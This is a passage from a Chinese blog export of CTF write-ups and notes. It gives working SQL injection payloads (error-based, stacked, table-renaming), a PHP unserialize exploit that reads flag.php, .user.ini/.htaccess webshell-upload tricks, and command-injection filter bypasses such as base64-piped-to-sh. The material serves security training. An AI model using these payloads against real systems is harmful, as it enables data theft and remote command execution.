<p>因为是图片马，不是php脚本文件，无法被解析运行。但是我们发现目录下有个index.php文件，可以利用这个文件，向其中写入写入文件，文件中再包含文件。执行木马。</p>
<p>1.上传user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">ato_prepend_file=</span><br></pre></td></tr></table></figure>

<p>2.上传图片马，文件名为1.jpg</p>
<h1 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">报表名</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(informatio</span><br><span class="line">n_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">爆列名</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(informati</span><br><span class="line">on_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">密码</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),</span><br><span class="line">1))or&#x27;1&amp;password=1</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),</span><br><span class="line">1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-HardSQL1-1"><a href="#极客大挑战-2019-HardSQL1-1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h1><p>上传图片木马成功，抓包之后，修改为phtml,php5,PHp都不可以，遇到这种情况有两种解决办法</p>
<p>1.上传.user.ini文件，在上传所包含的文件为图片马，利用var_dump</p>
<p>但是前提必须是有可以利用的php文件</p>
<p>2.先上传图片马，然后上传.htaccess文件，内容为SetHandler application/x-httpd-php，作用是将所有的文件当作php文件来解析</p>
<p>参考文章：<a href="https://www.cnblogs.com/HelloCTF/p/12987570.html">.user.ini和.htaccess - Hel10 - 博客园 (cnblogs.com)</a></p>
<h1 id="网鼎杯-2020-青龙组-AreUSerialz1"><a href="#网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz1"></a>[网鼎杯 2020 青龙组]AreUSerialz1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先看需要输入参数部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将序列化的结果传入给str,is_valid进行了过滤</p>
<p>unserialize()首先触发的是destruct(),接下来触发的是construct()</p>
<p>我们要读文章，因此可以忽略写文章，重点分析下面内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;		<span class="comment">//我们需要让op的值为2，进行读文件操作</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;	<span class="comment">//弱类型比较</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();	<span class="comment">//读文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);	<span class="comment">//输出文件</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;	<span class="comment">//让filename的值为flag.php，就可以直接读取到flag了，</span></span><br><span class="line">    <span class="comment">//也可以使用伪协议php://filter:read=convert.base64-encode/resource=flag.php读取flag文件</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;		<span class="comment">//对op的值进行强类型判断，这个地方可以用op = int 2 绕过，因为上面是弱类型进行比较的</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//强比较，这一步的强比较可以不正确，因为上一步弱比较成功过了</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;		<span class="comment">//我们不写文件，所以跟content没有什么关系</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();			<span class="comment">//调用process</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>方法一：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>变量属性是protected，它在序列化后会出现不可见字符%00*%00，可以在变量前输入\00*\00</p>
]]></content>
      <categories>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>linux caozuo</title>
    <url>/2022/01/14/linux-caozuo/</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="查找目录-ls"><a href="#查找目录-ls" class="headerlink" title="查找目录 ls"></a>查找目录 ls</h2><p>.隐藏文件</p>
<p>.当前文件夹 </p>
<p>..上级目录</p>
<p>-a  全部文件   -l 显示详细信息  </p>
<p>ls -lh  查看详细信息</p>
<p><strong>通配符</strong></p>
<p>*可以代替任意个数的字符  模糊查找   ？只能代替一个</p>
<p>[1234]23.txt   [1-4]23.txt</p>
<h2 id="切换目录-cd"><a href="#切换目录-cd" class="headerlink" title="切换目录   cd"></a>切换目录   cd</h2><p>cd   cd ~   切换到当前目录的主目录</p>
<p>cd .. 切换到上级目录  </p>
<p>cd - 在最近使用的两个之间来回切换目录</p>
<h2 id="创建和删除操作"><a href="#创建和删除操作" class="headerlink" title="创建和删除操作"></a>创建和删除操作</h2><p>touch 文件名</p>
<p>mkdir 创建新目录   -p   递归创建</p>
<p>rm  删除   不能恢复</p>
<h2 id="拷贝和移动文件"><a href="#拷贝和移动文件" class="headerlink" title="拷贝和移动文件"></a>拷贝和移动文件</h2><p>tree 以树状图列出文件目录结构   -d 只显示目录</p>
<p><strong>cp</strong>  源文件 目标文件  cd ~/dss/ef.txt . </p>
<p>-i 覆盖文件前的提示</p>
<p>-r 复制目录</p>
<p>mv 要移动文件的源 文件  目标文件</p>
<p>grep 查找</p>
<h1 id="远程管理命令"><a href="#远程管理命令" class="headerlink" title="远程管理命令"></a>远程管理命令</h1><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh -p 端口号 user@remote </p>
<p>exit 退出当前用户登录</p>
<p><img src="linux-caozuo.assets/image-20220114222034525.png" alt="image-20220114222034525"></p>
]]></content>
      <categories>
        <category>linux caozuo</category>
      </categories>
      <tags>
        <tag>linux caozuo</tag>
      </tags>
  </entry>
  <entry>
    <title>ping</title>
    <url>/2022/01/05/ping/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping-命令注入"><a href="#GXYCTF2019-Ping-Ping-Ping-命令注入" class="headerlink" title="[[GXYCTF2019]Ping Ping Ping]命令注入"></a>[[GXYCTF2019]Ping Ping Ping]命令注入</h1><p>1.管道符</p>
<p>； |  &amp;  常用</p>
<p>2.绕过</p>
<p>绕过空格</p>
<p>$IFS$9  &lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, I F S , {IFS},IFS,IFS</p>
<p>3.过滤单词</p>
<p>变量替换 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php </span><br></pre></td></tr></table></figure>

<p>过滤bash用sh执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  </span><br><span class="line">//Y2F0IGZsYWcucGhw -&gt;cat flag.php,输出给base64还原然后sh执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>内联执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">//内联，就是将反引号内命令的输出作为输入执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.关键字过滤</p>
<h5 id="方法一：特殊变量"><a href="#方法一：特殊变量" class="headerlink" title="方法一：特殊变量"></a>方法一：特殊变量</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$*</span><br><span class="line">$@</span><br><span class="line">$x    (x 代表 1-9)</span><br><span class="line">$&#123;x&#125;   (x&gt;=10)</span><br><span class="line">在没有传参的情况下，上面的特殊变量都是为空的 ca$&#123;21&#125;t a.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="方法二：反斜杠"><a href="#方法二：反斜杠" class="headerlink" title="方法二：反斜杠"></a>方法二：反斜杠</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca\t a.txt</span><br></pre></td></tr></table></figure>

<h5 id="方法三：变量替换"><a href="#方法三：变量替换" class="headerlink" title="方法三：变量替换"></a>方法三：变量替换</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=ca;b=t;c=a.txt;aaab $c</span><br></pre></td></tr></table></figure>

<h5 id="方法四：引号"><a href="#方法四：引号" class="headerlink" title="方法四：引号"></a>方法四：引号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&#x27;a&#x27;t flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>更多详情，查看以下文章</p>
<p>参考文章：[<a href="https://www.cnblogs.com/HelloCTF/p/13051220.html">GXYCTF2019]Ping Ping Ping(ping命令执行绕过Waf) - Hel10 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/qq_45655564/article/details/117395152">(41条消息) 命令注入————ctfhub（过滤cat、空格、目录分隔符、运算符、综合过滤练习）_小Low娃的博客-CSDN博客_ctfhub 命令注入 综合过滤</a></p>
]]></content>
      <categories>
        <category>ping</category>
      </categories>
      <tags>
        <tag>ping</tag>
      </tags>
  </entry>
  <entry>
    <title>sql</title>
    <url>/2021/12/26/sql/</url>
    <content><![CDATA[<h1 id="攻防世界-supersqli"><a href="#攻防世界-supersqli" class="headerlink" title="攻防世界-supersqli"></a>攻防世界-supersqli</h1><p>打开是sql注入，但是过滤了好多东西 /select|update|delete|drop|insrt|where|./i</p>
<p>网上搜了搜开始尝试着绕过，但是尝试了好几种绕过方法都不行，看了一下wp，知道是要采用堆叠注入，第一次知道，网上开搜。</p>
<p>1.查数据库</p>
<p>-1’;show databases;#</p>
<p>但是不明白，感觉查这个库没啥子作用</p>
<p>2.查表</p>
<p>-1’;show tables;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>出现了两个表单，都查询看一下嘛</p>
<p>3.查列表</p>
<p>（1）-1‘;show columns from <code>1919810931114514</code>;#</p>
<p>​    字符串为表名时进行操作时要加反引号``这两个标记符号，弄了我好长时间，没注意到反引号这玩意，错把单引号当反引号</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述">    flag ,NO字段</p>
<p>（2）-1’;show columns from <code>words</code>;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>id,NO等字段</p>
<p>因为这里是字段，而不是列名，不能直接进行查询。而且通过观察int()发现，写入到的内容存到了id中，推测查询的是words表中的内容，即输入的内容都会在words这个表中进行查询，但是flag不在这个表中</p>
<p>4.<strong>查询字段内容</strong></p>
<p>有两种方法</p>
<p>1.改表名</p>
<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>查看flag</p>
<p>1’ or 1=1#</p>
<p>2.预编译来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‘;sEt @sql = CONCAT(‘se’,‘lect * from <code>1919810931114514</code>;’); 进行预编译<br>prEpare stmt from @sql; 设置变量<br>EXECUTE stmt;# 执行</p>
<p>对预编译不是很了解，了解之后再做补充吧！！</p>
<p>最后，不愧是强网杯的题，真是难呀</p>
<p>参考文章：<a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">(40条消息) 攻防世界-supersqli详解_Mr_helloword的博客-CSDN博客</a></p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1​</span><br><span class="line"></span><br><span class="line">报表名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​爆列名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1​</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">密码?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1​​</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://blog.csdn.net/silence1_/article/details/90812612">(43条消息) sql注入之报错注入_silence1_的博客-CSDN博客_报错注入</a></p>
<h1 id="sql注入绕过大全"><a href="#sql注入绕过大全" class="headerlink" title="sql注入绕过大全"></a>sql注入绕过大全</h1><p><strong>基本绕过方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.大小写</span><br><span class="line">2.双写</span><br><span class="line">3.编码，如URLEncode编码，ASCII编码绕过</span><br><span class="line">4.内敛注释</span><br></pre></td></tr></table></figure>

<p><strong>空格绕过</strong></p>
